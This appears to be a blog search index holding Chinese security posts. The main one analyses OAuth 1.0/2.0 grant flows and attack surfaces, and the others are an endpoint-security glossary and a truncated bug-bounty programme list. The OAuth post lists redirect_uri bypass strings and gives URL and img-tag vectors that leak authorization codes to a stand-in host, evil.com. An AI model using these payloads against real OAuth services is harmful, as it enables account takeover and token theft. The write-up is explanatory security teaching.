<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>oauth2攻击面分析</title>
      <link href="/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着大量开放平台的出现，建立在开放平台之上的各种第三方应用也在大量涌现，出于对安全性和统一标准的要求，诞生了oauth协议。</p><p><a href="https://www.rfc-editor.org/rfc/rfc5849">OAuth 1.0</a>于2007年推出后迅速被广泛使用。</p><p>但是在2009年，OAuth 1.0被曝出存在严重安全漏洞<a href="https://oauth.net/advisories/2009-1/">Session Fixation Attack</a>，于同年发布修复后版本<a href="https://oauth.net/core/1.0a/">OAuth 1.0 Revision A</a>。</p><p>2010年发布<a href="https://www.rfc-editor.org/rfc/rfc6749">OAuth 2.0</a>，是OAuth协议的下一版本，但与OAuth 1.0版本互不兼容。</p><p>2013年发布<a href="https://www.rfc-editor.org/rfc/rfc7636">PKCE(Proof Key for Code Exchange by OAuth Public Clients)</a>，是OAuth 2.0的一个扩展，用于增强公共客户端的安全性。</p><p>2015年发布<a href="https://www.rfc-editor.org/rfc/rfc8252">OAuth 2.0 for Native Apps</a>，是OAuth 2.0的一个扩展，用于增强移动应用的安全性，描述了使用OAuth 2.0的本机和移动应用程序的安全要求和其他建议。包括不允许第三方应用打开嵌入式web视图，以防止钓鱼攻击，以及如何在平台上执行的特定建议。同时还建议使用PKCE扩展进一步保护用户。</p><p>2017年发布<a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics">Security Best Current Practice</a>，是OAuth 2.0的一个扩展，描述了安全要求和其他建议，用于实现OAuth 2.0的客户端和服务器。</p><p>2019年发布<a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps">OAuth 2.0 for Browser-Based Apps</a>，是OAuth 2.0的一个扩展，用于增强浏览器应用的安全性，针对SPA(Single Page Application)建议使用PKCE扩展替代隐式授权流(Implicit flow)。</p><p>2021年发布<a href="https://www.rfc-editor.org/rfc/rfc6749">OAuth 2.1</a>，OAuth 2.1总结了后续规范中发布的更改，以简化核心文档。主要区别如下:</p><ul><li>PKCE是所有使用授权码流的OAuth客户端的必需项</li><li>重定向URI必须使用精确字符串匹配进行比较</li><li>省略了隐式授权流（response_type &#x3D; token）的定义</li><li>省略了资源所有者密码凭证授予的定义</li><li>Bearer令牌使用省略了在URI的查询字符串中使用bearer令牌的使用</li><li>对于公共客户端，刷新令牌必须是发送者约束的或一次性使用</li><li>公共和机密客户端的定义已简化为仅指示客户端是否具有凭据</li></ul><h3 id="OAuth-1-0漏洞-Session-Fixation-Attack-分析"><a href="#OAuth-1-0漏洞-Session-Fixation-Attack-分析" class="headerlink" title="OAuth 1.0漏洞(Session Fixation Attack)分析"></a>OAuth 1.0漏洞(Session Fixation Attack)分析</h3><img src="/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/oauth-flow-normal.png" class=""><p>正常流程为：</p><ol><li>用户访问第三方应用</li><li>用户请求从资源提供者导入资源</li><li>用户携带oauth_token跳转到资源提供者的授权页面</li><li>用户登录到资源提供者系统</li><li>用户授权oauth_token访问资源权限</li><li>用户携带oauth_token跳转到return_url指定的第三方应用</li><li>第三方应用使用oauth_token请求资源</li></ol><p>攻击者可以利用的流程在3、4、5、6步骤</p><ol><li>攻击者构造包含oauth_token和无效return_url的URL</li><li>让受害者点击链接访问，登录授权后，跳转到无效return_url</li><li>此时受害者授权流程已经中断，攻击者可以利用受害者的oauth_token访问第三方应用完成授权</li></ol><p>漏洞成因可以总结为，授权码生成方式问题。OAuth1.0中，授权码在请求授权过程中可任意生成，导致授权码可能来自于攻击者。同时授权和令牌获取过程是割裂的，导致攻击者可以优先于受害者获取令牌。</p><h2 id="什么是OAuth2"><a href="#什么是OAuth2" class="headerlink" title="什么是OAuth2"></a>什么是OAuth2</h2><p>OAuth 2.0是一个业界标准的授权协议，其定义了四种可以适用于各种应用场景的授权交互模式：</p><ul><li>授权码模式(Authorization Code)</li><li>客户端凭证模式(Client Credentials)</li><li>用户凭证模式(Resource Owner Password Credentials)</li><li>隐式授权模式(Implicit)</li></ul><p>其中，授权码模式被广泛应用于第三方互联网开放平台，通过第三方登录是其最常见应用场景之一，比如使用微信、QQ和淘宝账号进行登录。</p><p>有一些设备存在无浏览器或输入受限情况，所以在<a href="https://www.rfc-editor.org/rfc/rfc8628">rfc8628 - OAuth 2.0 Device Authorization Grant</a>引入设备授权(Device code)模式。</p><p>为了解决SPA、原生应用等授权安全性问题，基于授权码模式引入PKCE，形成授权码+PKCE模式(Authorization Code with PKCE)。</p><h3 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h3><p>OAuth 2.0定义了四种角色：</p><ol><li>资源拥有者（Resource Owner）：资源拥有者是指可以授权第三方应用访问自己资源的用户，比如微信用户。</li><li>资源服务器（Resource Server）：资源服务器是指存储资源的服务器，比如微信服务器。</li><li>客户端（Client）：客户端是指第三方应用，比如京东小程序。</li><li>授权服务器（Authorization Server）：授权服务器是指用于进行授权的服务器，比如微信开放平台。</li></ol><h3 id="协议流程"><a href="#协议流程" class="headerlink" title="协议流程"></a>协议流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+--------+                               +---------------+</span><br><span class="line">|        |--(A)- Authorization Request -&gt;|   Resource    |</span><br><span class="line">|        |                               |     Owner     |</span><br><span class="line">|        |&lt;-(B)-- Authorization Grant ---|               |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |--(C)-- Authorization Grant --&gt;| Authorization |</span><br><span class="line">| Client |                               |     Server    |</span><br><span class="line">|        |&lt;-(D)----- Access Token -------|               |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |--(E)----- Access Token ------&gt;|    Resource   |</span><br><span class="line">|        |                               |     Server    |</span><br><span class="line">|        |&lt;-(F)--- Protected Resource ---|               |</span><br><span class="line">+--------+                               +---------------+</span><br></pre></td></tr></table></figure><ul><li>A. 客户端向资源拥有者发起授权请求，请求授权服务器授予客户端访问资源服务器的权限。</li><li>B. 资源拥有者授权客户端访问资源服务器的权限，授权服务器返回授权码给客户端。</li><li>C. 客户端向授权服务器请求访问令牌。</li><li>D. 授权服务器验证授权码，返回访问令牌给客户端。</li><li>E. 客户端向资源服务器请求资源。</li><li>F. 资源服务器验证访问令牌，返回资源给客户端。</li></ul><h3 id="授权模式"><a href="#授权模式" class="headerlink" title="授权模式"></a>授权模式</h3><p>仅ABCD流程不同，区分为不同模式。</p><h4 id="授权码模式-Authorization-Code"><a href="#授权码模式-Authorization-Code" class="headerlink" title="授权码模式(Authorization Code)"></a>授权码模式(Authorization Code)</h4><img src="/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8F.jpg" class=""><p>这种模式广泛用于第三方应用授权登录，比如使用微信、QQ账号进行登录。</p><h4 id="授权码-PKCE模式-Authorization-Code-with-PKCE"><a href="#授权码-PKCE模式-Authorization-Code-with-PKCE" class="headerlink" title="授权码+PKCE模式(Authorization Code with PKCE)"></a>授权码+PKCE模式(Authorization Code with PKCE)</h4><p>在<a href="https://www.rfc-editor.org/rfc/rfc7636">rfc7636 - Proof Key for Code Exchange by OAuth Public Clients</a>定义了PKCE，用于解决授权码模式存在的安全性问题。</p><img src="/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/%E6%8E%88%E6%9D%83%E7%A0%81PKCE%E6%A8%A1%E5%BC%8F.jpg" class=""><p>这种模式广泛用于客户端应用授权登录，比如electron应用、移动应用等。</p><p>其中：</p><ul><li>code_verifier：在 <code>[A-Z] / [a-z] / [0-9] / &quot;-&quot; / &quot;.&quot; / &quot;_&quot; / &quot;~&quot;</code> 范围内，生成43-128位的随机字符串。</li><li>code_challenge：则是对 code_verifier 通过 code_challenge_method 例如 sha256 转换得来的。</li></ul><blockquote><p>Q: PKCE到底防御哪种攻击？</p><p>A: 在SPA、原生应用（如移动应用）、桌面应用（如electron）中，授权过程中有可能会打开外部浏览器，而浏览器可能会被其他应用劫持，导致授权过程被篡改。PKCE是为了防御这种攻击。</p></blockquote><h4 id="客户端凭证模式-Client-Credentials"><a href="#客户端凭证模式-Client-Credentials" class="headerlink" title="客户端凭证模式(Client Credentials)"></a>客户端凭证模式(Client Credentials)</h4><img src="/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%87%AD%E8%AF%81%E6%A8%A1%E5%BC%8F.jpg" class=""><p>这种模式用于客户端应用存储凭证，自行授权访问资源服务器，比如后端服务使用AK&#x2F;SK请求操作OSS资源。</p><h4 id="用户凭证模式-Resource-Owner-Password-Credentials-不安全"><a href="#用户凭证模式-Resource-Owner-Password-Credentials-不安全" class="headerlink" title="用户凭证模式(Resource Owner Password Credentials) 不安全"></a>用户凭证模式(Resource Owner Password Credentials) 不安全</h4><img src="/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81%E6%A8%A1%E5%BC%8F.jpg" class=""><p>由于凭证会发送给第三方使用，所以这种模式不安全，不推荐使用。</p><h4 id="隐式授权模式-Implicit-不安全"><a href="#隐式授权模式-Implicit-不安全" class="headerlink" title="隐式授权模式(Implicit) 不安全"></a>隐式授权模式(Implicit) 不安全</h4><img src="/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83%E6%A8%A1%E5%BC%8F.jpg" class=""><p>一般用于无后端应用，前端存储凭证。</p><p>由于是跳转到三方应用使用GET请求，且服务器直接回传的是授权凭证，在终端容易被读取，如通过资源文件referer，所以这种模式不安全，不推荐使用。</p><p>在某篇博客中曾看到，腾讯存在某个服务使用了隐式授权模式，但是回传Access Token的时候，使用锚点（#），这样锚点之后的数据就不会发送给服务器。但是这种方式也存在安全问题，因为锚点之后的数据是可以被前端获取的，所以这种方式也不安全。</p><h4 id="设备代码模式-Device-Code-极大概率存在Session-Fixation-Attack漏洞"><a href="#设备代码模式-Device-Code-极大概率存在Session-Fixation-Attack漏洞" class="headerlink" title="设备代码模式(Device Code) 极大概率存在Session Fixation Attack漏洞"></a>设备代码模式(Device Code) 极大概率存在Session Fixation Attack漏洞</h4><p>在<a href="https://www.rfc-editor.org/rfc/rfc8628">rfc8628 - OAuth 2.0 Device Authorization Grant</a>定义了一种新的授权模式，用于设备在无浏览器或输入受限情况下的授权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">+----------+                                +----------------+</span><br><span class="line">|          |&gt;---(A)-- Client Identifier ---&gt;|                |</span><br><span class="line">|          |                                |                |</span><br><span class="line">|          |&lt;---(B)-- Device Code,      ---&lt;|                |</span><br><span class="line">|          |          User Code,            |                |</span><br><span class="line">|  Device  |          &amp; Verification URI    |                |</span><br><span class="line">|  Client  |                                |                |</span><br><span class="line">|          |  [polling]                     |                |</span><br><span class="line">|          |&gt;---(E)-- Device Code       ---&gt;|                |</span><br><span class="line">|          |          &amp; Client Identifier   |                |</span><br><span class="line">|          |                                |  Authorization |</span><br><span class="line">|          |&lt;---(F)-- Access Token      ---&lt;|     Server     |</span><br><span class="line">+----------+   (&amp; Optional Refresh Token)   |                |</span><br><span class="line">      v                                     |                |</span><br><span class="line">      :                                     |                |</span><br><span class="line">      (C) User Code &amp; Verification URI      |                |</span><br><span class="line">      :                                     |                |</span><br><span class="line">      v                                     |                |</span><br><span class="line">+----------+                                |                |</span><br><span class="line">| End User |                                |                |</span><br><span class="line">|    at    |&lt;---(D)-- End user reviews  ---&gt;|                |</span><br><span class="line">|  Browser |          authorization request |                |</span><br><span class="line">+----------+                                +----------------+</span><br></pre></td></tr></table></figure><img src="/2023/03/29/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/%E8%AE%BE%E5%A4%87%E4%BB%A3%E7%A0%81%E6%A8%A1%E5%BC%8F.jpg" class=""><p>当Device Client为公共客户端，将退化为OAuth1.0认证方式。</p><h3 id="OIDC"><a href="#OIDC" class="headerlink" title="OIDC"></a>OIDC</h3><p>OpenID Connect 1.0 是 OAuth 2.0 协议的一个简单身份层。它允许客户端基于授权服务器执行的身份验证来验证最终用户的身份，以及以可互操作且类似 REST 的方式获取有关最终用户的基本配置文件信息。</p><p>简单来说：</p><ul><li>授权码模式：使用type&#x3D;code，用授权码换取令牌AccessToken。</li><li>OIDC：使用type&#x3D;id_token，用授权码换取用于验证身份的JWT。</li></ul><h2 id="OAuth2攻击面"><a href="#OAuth2攻击面" class="headerlink" title="OAuth2攻击面"></a>OAuth2攻击面</h2><h3 id="CSRF导致绑定劫持"><a href="#CSRF导致绑定劫持" class="headerlink" title="CSRF导致绑定劫持"></a>CSRF导致绑定劫持</h3><p>攻击者抓取认证请求构造恶意url，并诱骗已经登录的网用户点击(比如通过邮件或者QQ等方式)，认证成功后用户的帐号会同攻击者的帐号绑定到一起。</p><p>OAuth 2.0提供了state参数用于防御CSRF，认证服务器在接收到的state参数按原样返回给redirect_uri，客户端收到该参数并验证与之前生成的值是否一致，除此方法外也可使用传统的CSRF防御方案。</p><ul><li>案例1: <a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-054785">人人网-百度OAuth 2.0 redirect_uir CSRF 漏洞</a></li></ul><h3 id="redirect-uri绕过导致授权劫持"><a href="#redirect-uri绕过导致授权劫持" class="headerlink" title="redirect_uri绕过导致授权劫持"></a>redirect_uri绕过导致授权劫持</h3><p>根据OAuth的认证流程，用户授权凭证会由服务器转发到redirect_uri对应的地址。</p><p>如果攻击者伪造redirect_uri为自己的地址，然后诱导用户发送该请求，之后获取的凭证就会发送给攻击者伪造的回调地址，攻击者使用该凭证即可登录用户账号，造成授权劫持。</p><p>正常情况下，为了防止该情况出现，认证服务器会验证自己的client_id与回调地址是否对应，常见的方法是验证回调地址的主域。</p><p>以下几种情况验证配置不当，容易导致授权劫持：</p><ol><li>未验证</li></ol><p>未验证的情况，可以直接跳出外域。案例:<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-045318">土豆网某处认证缺陷可劫持oauth_token</a></p><ol start="2"><li>验证绕过</li></ol><ul><li><code>auth.app.com.evil.com</code></li><li><code>evil.com?auth.app.com</code></li><li><code>evil.com?@auth.app.com</code> 案例:<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059427">腾讯OAuth平台 redirect_uri 过滤不严可能导致用户信息遭窃取（二）</a></li><li><code>auth.app.com@evil.com</code> 案例:<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-045327">绕过网易oauth认证的redirect_uri限制劫持帐号token</a></li><li><code>auth.app.com\@evil.com</code> 案例:<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059676">腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取（四）</a></li><li><code>evil.com\auth.app.com</code></li><li><code>evil.com:\auth.app.com</code></li><li><code>evil.com\.auth.app.com</code> 案例:<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059403">腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取</a></li><li><code>evil.com:\@auth.app.com</code> 案例:<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059455">新浪微博OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取</a></li><li><code>宽字符绕过</code> 案例: <a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059639">腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取（三）</a></li></ul><ol start="3"><li>子域可控</li></ol><p>对回调地址验证了主域为app.com，但其子域evil.app.com可被任意用户注册使用。案例:<a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-060586">新浪微博部分App Oauth2漏洞</a></p><ol start="4"><li>跨域</li></ol><ul><li>（1）利用可信域跳转盗取授权码。</li></ul><p>如果网站存在任意跳转，如<code>https://www.example.com/?return_url=</code>，且未校验跳转后地址。可以构造如下向量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com/?return_url=https://www.evil.com</span><br></pre></td></tr></table></figure><p>诱骗用户访问该链接，触发OAuth认证如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com/oauth/authorize?client_id=xxx&amp;redirect_uri=https://www.example.com/?return_url=https://www.evil.com&amp;response_type=code&amp;state=xxx</span><br></pre></td></tr></table></figure><p>用户授权之后，会继续跳转到<code>https://www.evil.com</code>，攻击者可以从<code>referer</code>头获取到授权码。</p><ul><li>（2）利用可信域referer盗取授权码。</li></ul><p>如果跳转后页面可控，比如可以插入自定义图片，或者存在xss漏洞，可以构造如下向量：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.evil.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户授权之后，会向<code>https://www.evil.com</code>请求资源文件，攻击者可以从<code>referer</code>头获取到授权码。</p><h3 id="scope越权访问"><a href="#scope越权访问" class="headerlink" title="scope越权访问"></a>scope越权访问</h3><p>案例:<a href="https://coolshell.cn/articles/11021.html">从“黑掉GITHUB”学WEB安全开发</a>展示了scope权限控制不当带来的安全风险，同时将授权劫持的几个方面演绎的淋漓尽致。</p><!-- ## OAuth2实例分析### 腾讯TODO --><h2 id="缩写"><a href="#缩写" class="headerlink" title="缩写"></a>缩写</h2><ul><li>CAS: Central Authentication Service, 中心认证服务</li><li>AS: Authorization Server, 授权服务器</li><li>RS: Resource Server, 资源服务器</li><li>SPA: Single Page Application, 单页应用</li><li>SSO: Single Sign On, 单点登录</li><li>OIDC: OpenID Connect, 开放身份连接</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.rfc-editor.org/rfc/rfc5849">rfc5849 - The OAuth 1.0 Protocol</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc6749">rfc6749 - The OAuth 2.0 Authorization Framework</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc6750">rfc6750 - The OAuth 2.0 Authorization Framework: Bearer Token Usage</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc6819">rfc6819 - OAuth 2.0 Threat Model and Security Considerations</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc7009">rfc7009 - OAuth 2.0 Token Revocation</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc7521">rfc7521 - Assertion Framework for OAuth 2.0 Client Authentication and Authorization Grants</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc7522">rfc7522 - Security Assertion Markup Language (SAML) 2.0 Profile for OAuth 2.0 Client Authentication and Authorization Grants</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc7523">rfc7523 - JSON Web Token (JWT) Profile for OAuth 2.0 Client Authentication and Authorization Grants</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc7591">rfc7591 - OAuth 2.0 Dynamic Client Registration Protocol</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc7592">rfc7592 - OAuth 2.0 Dynamic Client Registration Management Protocol</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc7636">rfc7636 - Proof Key for Code Exchange by OAuth Public Clients</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc7662">rfc7662 - OAuth 2.0 Token Introspection</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc8252">rfc8252 - OAuth 2.0 for Native Apps</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc8414">rfc8414 - OAuth 2.0 Authorization Server Metadata</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc8628">rfc8628 - OAuth 2.0 Device Authorization Grant</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc8693">rfc8693 - OAuth 2.0 Token Exchange</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc8705">rfc8705 - OAuth 2.0 Mutual-TLS Client Authentication and Certificate-Bound Access Tokens</a></li><li><a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics">Security Best Current Practice</a></li><li><a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps">OAuth 2.0 for Browser-Based Apps</a></li><li><a href="https://oauth.net/2/">oauth.net</a></li><li><a href="https://zhuanlan.zhihu.com/p/92051359">白话让你理解什么是oAuth2协议</a></li><li><a href="https://www.cnblogs.com/h2zZhou/p/5741262.html">OAuth 2.0攻击面与案例总结</a></li><li><a href="https://www.authing.cn/blog/558">OIDC &amp; OAuth2.0 协议及其授权模式详解</a></li><li><a href="https://www.ruanyifeng.com/blog/2019/04/oauth_design.html">OAuth 2.0 的一个简单解释</a></li><li><a href="https://openid.net/connect/">OpenID Connect</a></li></ul><h2 id="关于作者"><a href="#关于作者" class="headerlink" title="关于作者"></a>关于作者</h2><p>更多内容请访问<a href="https://pinohans.github.io/">Pinohans Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oauth2 </tag>
            
            <tag> pentest </tag>
            
            <tag> bugbounty </tag>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全名词释义</title>
      <link href="/2023/02/01/%E5%AE%89%E5%85%A8%E5%90%8D%E8%AF%8D%E9%87%8A%E4%B9%89/"/>
      <url>/2023/02/01/%E5%AE%89%E5%85%A8%E5%90%8D%E8%AF%8D%E9%87%8A%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><table><thead><tr><th align="left">缩写</th><th align="left">全拼</th><th align="left">翻译</th><th align="left">释义</th></tr></thead><tbody><tr><td align="left">AntiVirus</td><td align="left">anti-virus software</td><td align="left">防病毒保护</td><td align="left"></td></tr><tr><td align="left">EPP</td><td align="left">endpoint protection platform</td><td align="left">端点防护平台</td><td align="left"></td></tr><tr><td align="left">EDR</td><td align="left">endpoint detection and response</td><td align="left">端点检测和响应</td><td align="left"></td></tr></tbody></table><h3 id="Antivirus"><a href="#Antivirus" class="headerlink" title="Antivirus"></a>Antivirus</h3><p>防病毒保护是最常见的端点安全类型，尤其是在消费电子产品中。有些设备预装了防病毒软件，但也有供应商提供高级解决方案以提供更高级的保护。典型的防病毒软件会扫描用户的计算机以查找恶意软件，例如蠕虫、特洛伊木马、广告软件、勒索软件等。它通过使用三种类型的检测来实现这一点：</p><ol><li>签名比较：监控设备以获取已知威胁的证据并阻止它们采取进一步行动；</li><li>启发式分析：通过将新程序与启发式数据库中已知的病毒进行比较，检查新程序的可疑源代码或行为；</li><li>完整性检查：检查系统文件是否有损坏的证据。</li></ol><p>一些防病毒供应商支持人工智能 (AI) 和机器学习，但很多供应商不支持。这些高级功能对于保护端点免受经常试图破坏业务数据的各种复杂威胁至关重要。</p><h3 id="EPP"><a href="#EPP" class="headerlink" title="EPP"></a>EPP</h3><p>端点保护平台 (EPP) 通常包括防病毒工具，同时还提供一些额外的关键功能。首先，它添加了机器学习来支持行为分析，从而将传统威胁监控扩展到已知威胁之外。除了更常见的攻击之外，此功能还允许 EPP防止未知攻击。EPP 还会验证妥协指标 (IoC) 并监控设备的内存，以识别内存消耗中的不规则模式。</p><p>EPP优于基本的防病毒保护，适用于大公司的广泛端点管理和威胁预防，但一些复杂的攻击仍然能够逃避检测。还值得注意的是，虽然 EPP 可用于识别漏洞和防止攻击，但它不会采取措施消除通过您的端点前进的活动威胁。这就是为什么它经常与 EDR 解决方案结合以创建多层安全系统。</p><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>端点检测和响应 (EDR) 代表最新和最先进的端点保护层。它扩展了对 AI、机器学习、威胁情报和行为分析的典型 EPP 支持，以创建可主动消除攻击的解决方案。如果 EPP 是一面盾牌，那么 EDR 就是一把剑。为此，EDR 系统从网络中的端点收集和分析数据，以便阻止攻击的发生。一旦威胁被消除，EDR 就可以用来追踪攻击的确切来源，这样就可以在未来防止类似的事件发生。</p><p>EDR 充当组织端点网络范围内的集中管理中心。它可以在检测到最早迹象时阻止攻击，甚至在人类管理员得知威胁存在之前。EPP 是提供被动威胁防御的第一道防线，而 EDR 会在网络攻击造成重大损害之前主动减轻网络攻击。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.esecurityplanet.com/endpoint/antivirus-vs-epp-vs-edr/">Antivirus vs. EPP vs. EDR: How to Secure Your Endpoints</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应中心src经验与记录</title>
      <link href="/2023/01/01/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83src%E7%BB%8F%E9%AA%8C%E4%B8%8E%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/01/01/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83src%E7%BB%8F%E9%AA%8C%E4%B8%8E%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://portswigger.net/burp">burpsuite</a>一款强大的web安全测试工具</li><li><a href="https://github.com/TophantTechnology/ARL">ARL(Asset Reconnaissance Lighthouse)</a>资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面</li></ul><h2 id="src列表"><a href="#src列表" class="headerlink" title="src列表"></a>src列表</h2><table><thead><tr><th>厂商</th><th>链接</th><th>id</th></tr></thead><tbody><tr><td>腾讯</td><td><a href="https://security.tencent.com/">https://security.tencent.com/</a></td><td>pinohans</td></tr><tr><td>滴滴</td><td><a href="https://sec.didichuxing.com/">https://sec.didichuxing.com/</a></td><td>pinohans</td></tr><tr><td>字节跳动</td><td><a href="https://security.bytedance.com/">https://security.bytedance.com/</a></td><td></td></tr><tr><td>京东</td><td><a href="https://security.jd.com/">https://security.jd.com/</a></td><td></td></tr><tr><td>百度</td><td><a href="https://bsrc.baidu.com/">https://bsrc.baidu.com/</a></td><td></td></tr><tr><td>360</td><td><a href="https://security.360.cn/">https://security.360.cn/</a></td><td></td></tr><tr><td>理想</td><td><a href="https://security.lixiang.com/">https://security.lixiang.com/</a></td><td></td></tr><tr><td>美团</td><td><a href="https://security.meituan.com/">https://security.meituan.com/</a></td><td></td></tr><tr><td>荣耀</td><td><a href="https://security.hihonor.com/">https://security.hihonor.com/</a></td><td></td></tr><tr><td>快手</td><td><a href="https://security.kuaishou.com/">https://security.kuaishou.com/</a></td><td></td></tr><tr><td>OPPO</td><td><a href="https://security.oppo.com/">https://security.oppo.com/</a></td><td></td></tr><tr><td>阿里巴巴</td><td><a href="https://security.alibaba.com/">https://security.alibaba.com/</a></td><td></td></tr><tr><td>顺丰</td><td><a href="https://sfsrc.sf-express.com/">https://sfsrc.sf-express.com/</a></td><td></td></tr><tr><td>中通</td><td><a href="https://sec.zto.com/">https://sec.zto.com/</a></td><td></td></tr><tr><td>自如</td><td><a href="https://zrsecurity.ziroom.com/">https://zrsecurity.ziroom.com/</a></td><td></td></tr><tr><td>平安</td><td><a href="https://security.pingan.com/">https://security.pingan.com/</a></td><td></td></tr><tr><td>微博</td><td><a href="https://wsrc.weibo.com/">https://wsrc.weibo.com/</a></td><td></td></tr><tr><td>一起教育</td><td><a href="https://security.17zuoye.com/">https://security.17zuoye.com/</a></td><td></td></tr><tr><td>金山</td><td><a href="https://security.wps.cn/">https://security.wps.cn/</a></td><td></td></tr><tr><td>看云</td><td><a 